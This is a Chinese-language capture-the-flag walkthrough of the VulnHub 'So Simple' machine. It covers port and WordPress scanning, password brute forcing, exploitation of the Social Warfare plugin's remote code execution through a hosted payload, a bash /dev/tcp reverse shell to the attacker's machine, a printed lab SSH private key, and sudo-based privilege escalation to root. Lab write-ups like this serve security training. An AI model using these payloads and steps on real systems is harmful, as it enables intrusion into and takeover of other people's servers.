# SoSimple

> https://download.vulnhub.com/sosimple/So-Simple-1.7z

靶场IP：`192.168.2.19`

扫描对外端口服务

```
┌──(root㉿kali)-[~/Desktop]
└─# nmap -p1-65535 -sV 192.168.2.19
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-12 11:03 EDT
Nmap scan report for 192.168.2.19
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:19:68:92 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds

```

浏览器访问80端口

![image-20220912230418255](../../.gitbook/assets/image-20220912230418255.png)

```
┌──(root㉿kali)-[~/Desktop]
└─# dirb http://192.168.2.19/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Sep 12 11:04:23 2022
URL_BASE: http://192.168.2.19/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.2.19/ ----
+ http://192.168.2.19/index.html (CODE:200|SIZE:495)                                                                                                                                                                                      
+ http://192.168.2.19/server-status (CODE:403|SIZE:277)                                                                                                                                                                                   
==> DIRECTORY: http://192.168.2.19/wordpress/                                                                                                                                                                                             
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.2.19/wordpress/ ----
+ http://192.168.2.19/wordpress/index.php (CODE:301|SIZE:0)                                                                                                                                                                               
==> DIRECTORY: http://192.168.2.19/wordpress/wp-admin/                                                                                                                                                                                    
==> DIRECTORY: http://192.168.2.19/wordpress/wp-content/                                                                                                                                                                                  
==> DIRECTORY: http://192.168.2.19/wordpress/wp-includes/                                                                                                                                                                                 
+ http://192.168.2.19/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                                                                                                                                             
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.2.19/wordpress/wp-admin/ ----
                                                               
```

使用wpscan进行扫描

```
┌──(root㉿kali)-[~/Desktop]
└─# wpscan --url http://192.168.2.19/wordpress/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.2.19/wordpress/ [192.168.2.19]
[+] Started: Mon Sep 12 11:05:15 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.2.19/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.2.19/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.2.19/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.2.19/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.11 identified (Latest, released on 2022-08-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.2.19/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.11</generator>
 |  - http://192.168.2.19/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.11</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.2.19/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://192.168.2.19/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://192.168.2.19/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.2.19/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simple-cart-solution
 | Location: http://192.168.2.19/wordpress/wp-content/plugins/simple-cart-solution/
 | Last Updated: 2022-04-17T20:50:00.000Z
 | [!] The version is out of date, the latest version is 1.0.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 0.2.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.2.19/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.2.19/wordpress/wp-content/plugins/simple-cart-solution/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.2.19/wordpress/wp-content/plugins/simple-cart-solution/readme.txt

[+] social-warfare
 | Location: http://192.168.2.19/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2021-07-20T16:09:00.000Z
 | [!] The version is out of date, the latest version is 4.3.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.2.19/wordpress/, Match: 'Social Warfare v3.5.0'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.2.19/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0
 |   - http://192.168.2.19/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.2.19/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.2.19/wordpress/wp-content/plugins/social-warfare/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Sep 12 11:05:18 2022
[+] Requests Done: 190
[+] Cached Requests: 5
[+] Data Sent: 49.92 KB
[+] Data Received: 19.333 MB
[+] Memory used: 241.766 MB
[+] Elapsed time: 00:00:03

```

枚举用户

```
┌──(root㉿kali)-[~/Desktop]
└─# wpscan --url http://192.168.2.19/wordpress/ -eu

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.2.19/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] max
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

爆破密码

```
┌──(root㉿kali)-[~/Desktop]
└─# wpscan --url http://192.168.2.19/wordpress/ -U max -P /usr/share/wordlists/rockyou.txt

[!] Valid Combinations Found:
 | Username: max, Password: opensesame

```

不过无法直接上传shell。

![image-20220912231038680](../../.gitbook/assets/image-20220912231038680.png)

我尝试使用Searchsploit搜索任何可用的插件`social-warfare`漏洞，我得到了这个

```
┌──(root㉿kali)-[~/Desktop]
└─# searchsploit social warfare
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution                                                                                                                                          | php/webapps/46794.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```
┌──(root㉿kali)-[/tmp]
└─# cat payload 
<pre>system('cat /etc/passwd')</pre>
```

```
http://192.168.2.19/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.2.5/payload
```

![image-20220912231648262](../../.gitbook/assets/image-20220912231648262.png)

反弹shell

```
<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.2.5/1234 0>&1'")</pre>
```

![image-20220912232113768](../../.gitbook/assets/image-20220912232113768.png)

找到max用户的私钥

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

使用私钥进行登录

```
┌──(root㉿kali)-[/tmp]
└─# ssh -i id_rsa max@192.168.2.19                           
The authenticity of host '192.168.2.19 (192.168.2.19)' can't be established.
ED25519 key fingerprint is SHA256:+ejHZkFq2lUl66K6hxgfr5b2MoCZzYE8v3yBV3/XseI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.19' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep 12 15:24:03 UTC 2022

  System load:  0.0               Processes:                134
  Usage of /:   58.6% of 8.79GB   Users logged in:          0
  Memory usage: 21%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for enp0s3:  192.168.2.19

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

47 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul 15 19:18:39 2020 from 192.168.1.7
max@so-simple:~$ 

```

查看sudo列表

```
max@so-simple:~$ sudo -l
Matching Defaults entries for max on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service

```

sudo提权到steven用户

```
max@so-simple:~$ sudo -u steven /usr/sbin/service ../../bin/bash
steven@so-simple:/$ id
uid=1001(steven) gid=1001(steven) groups=1001(steven)
```

查看sudo列表

```
steven@so-simple:/$ sudo -l
Matching Defaults entries for steven on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh

```

提权

```
steven@so-simple:/$ mkdir /opt/tools
steven@so-simple:/$ echo -e  '#!/bin/bash\n\nbash' >  /opt/tools/server-health.sh
steven@so-simple:/$ chmod 777 /opt/tools/server-health.sh
steven@so-simple:/$ sudo /opt/tools/server-health.sh
root@so-simple:/# id
uid=0(root) gid=0(root) groups=0(root)

```

